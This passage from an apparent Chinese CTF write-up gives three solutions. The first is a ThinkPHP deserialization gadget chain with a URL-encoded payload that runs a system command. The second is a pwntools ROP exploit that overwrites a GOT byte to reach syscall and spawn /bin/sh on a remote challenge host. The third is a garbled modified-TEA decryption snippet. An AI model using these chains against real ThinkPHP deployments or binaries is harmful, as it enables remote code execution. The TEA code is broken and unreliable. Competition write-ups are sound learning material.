        }
    }
    namespace think\model {
        use think\Model;
        class Pivot extends Model
        {
            function __construct()
            {
                parent::__construct();
            }
        }
        $b = new Pivot();
        echo urlencode(serialize($b));
    }
    namespace think\route {
        use think\Middleware;
        use think\Validate;
        class Url
        {
            protected $url;
            protected $domain;
            protected $app;
            protected $route;
            public function __construct()
            {
                $this->url = 'a:';
                $this->domain = "";
                $this->app = new Middleware();
                $this->route = new Validate();
            }
        }
    }
    namespace think {
        use think\view\driver\Php;
        class Validate
        {
            public function __construct()
            {
                $this->type['getDomainBind'] = [new Php(), 'display'];
            }
        }
        class Middleware
        {
            public function __construct()
            {
                $this->request = "2333";
            }
        }
    }
    namespace think\view\driver {
        class Php
        {
            public function __construct()
            {
            }
        }
    }
payload：
    ///public/index.php/Index/unser?vulvul=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A15%3A%22think%5Croute%5CUrl%22%3A4%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A2%3A%22a%3A%22%3Bs%3A9%3A%22%00%2A%00domain%22%3Bs%3A38%3A%22%3C%3Fphp+system%28%22cat+%2Fflag%22%29%3B+exit%28%29%3B%0D%0A%3F%3E%22%3Bs%3A6%3A%22%00%2A%00app%22%3BO%3A16%3A%22think%5CMiddleware%22%3A1%3A%7Bs%3A7%3A%22request%22%3Bi%3A2333%3B%7Ds%3A8%3A%22%00%2A%00route%22%3BO%3A14%3A%22think%5CValidate%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00type%22%3Ba%3A1%3A%7Bs%3A13%3A%22getDomainBind%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22think%5Cview%5Cdriver%5CPhp%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22display%22%3B%7D%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A7%3B%7D%7D
得到flag
## pwn
###  blind
基本检查
    socphob@giao:/mnt/c/Users/admin/Desktop/xhlj$ checksec ./blind
    [*] '/mnt/c/Users/admin/Desktop/xhlj/blind'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    socphob@giao:/mnt/c/Users/admin/Desktop/xhlj$
main
    ssize_t __fastcall main(int a1, char **a2, char **a3)
    {
      char buf[80]; // [rsp+0h] [rbp-50h] BYREF
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      alarm(8u);
      sleep(3u);
      return read(0, buf, 0x500uLL);
    }
题目非常简短，main函数里面仅仅调用了`alarm`，`sleep`和`read`，就是普通的栈溢出，但是没有输出函数，看起来是没法泄露leak
libc的。那这里怎么办？函数在首次执行时，会把真实地址写到got表的表项中，它是一个libc的地址，低一个半字节是固定的，这里可以通过ROP爆破修改got表项的低字节来使他指向它附近的地址，在libc2.27-2.23中`alarm
+ 5`的位置有`syscall`，在`2.31`中在`alarm +
9`，可以爆破修改`[PI:EMAIL](mailto:PI:EMAIL)` 为`0x5, 0x15 ... 0xf5` 或者
`0x9,0x19...0xf9` 来改为`syscall`,然后ROP通过系统调用执行`/bin/sh`。
> Don’t try to guess the libc version or Brute-force attack.Believe me, there
> will be no results,but there is a general way to solve it.
然后这里就不得不吐槽题目附件中的`readme.txt`，属实把我坑到了。让不要去猜libc版本和暴力攻击，再加上我上午爆破了一次（包括0xd5），没有打通。我就开始怀疑是不是我的做法有问题，libc魔改了？然后就到网上一直搜只有`read`，无法leak怎么做，一直尝试各种方法，general
way我以为有什么妙招我不知道。最后绕了半天，又回到了最开始，(0xd5打通了)
got表
实现`syscall`调用`execve('/bin/sh\x00',0,0)`。
ROP的思路是先调用三次read，1.将`[PI:EMAIL](mailto:PI:EMAIL)`的低字节改为0x?5，2.把`/bin/sh/\x00`写到bss段，3.控制`rax`为0x3b。
然后`ret2csu`执行。
`ret2csu`，通过`r13`控制`rdi`，通过`r12`和`rbx`调用`alarm`。
EXP：
    from pwn import *
    context.terminal = ['tmux', 'splitw', '-h']
    context.log_level = 'debug'
    p = remote('82.157.6.165', 31400)
    # p = process('./blind')
    elf = ELF('./blind')
    bss = 0x601040
    pop_rdi_ret = 0x4007c3
    pop_rsi_r15_ret = 0x4007c1
    # 往bss中写入 /bin/sh\x00
    sleep(3)
    payload = b'A' * 0x58 + p64(pop_rsi_r15_ret) + p64(bss) + p64(0) + p64(elf.plt['read'])
    payload += p64(pop_rsi_r15_ret) + p64(elf.got['alarm']) + p64(0) + p64(elf.plt['read'])  # 改写alarm的值
    payload += p64(pop_rsi_r15_ret) + p64(0x601050) + p64(0) + p64(elf.plt['read'])  # 这里调用read是为了控制rax为0x3b
    payload += p64(0x4007BA) + p64(0) + p64(1) + p64(elf.got['alarm']) + p64(0) + p64(0) + p64(bss) + p64(
        0x4007A0)  # 通过ret2csu控制其他参数
    p.sendline(payload)
    sleep(0.5)
    p.sendline(b'/bin/sh\x00')
    sleep(0.5)
    p.send(b'\xd5')  # 改写alarm到syscall'
    sleep(0.5)
    p.send(b'C' * 0x3b)  # 使得rax=0x3b
    p.sendline('cat /flag')
    p.interactive()
## re
###  TacticalArmed
根据main函数和`sub_4011F0`可以注意到 这是一个shellcode动态生成器，每一轮会复制新的汇编语句，然后执行一句后返回，期间保存寄存器信息
大概执行了这些关键shellcode 从而定位到此可能为TEA算法
    ;忽略部分代码
    sub ecx, 0x7E5A96D2
    ;忽略部分代码
    shr edx, 0x5
    ;忽略部分代码
    shl edx, 0x4
然后key 在 `405000` 在TLS_CALLBACK 用利用`int 2d`检测调试器 替换key。
经过调试发现 此不为标准算法：
此TEA算法有33轮，并且每轮TEA加密后的sum 不会清0
最终写出exp
    #include 
    void my_TEA_decrypt(uint32_t* v, uint32_t* k,uint32_t sum) {
        uint32_t v0 = v[0], v1 = v[1], i;  /* set up */
        uint32_t delta = 0x7E5A96D2;                     /* a key schedule constant */
        uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];   /* cache key */
        for (i = 0; i > 5) + k3);
            v0 -= ((v1 > 5) + k1);
            sum += delta;
        }                                              /* end cycle */
        v[0] = v0; v[1] = v1;
    }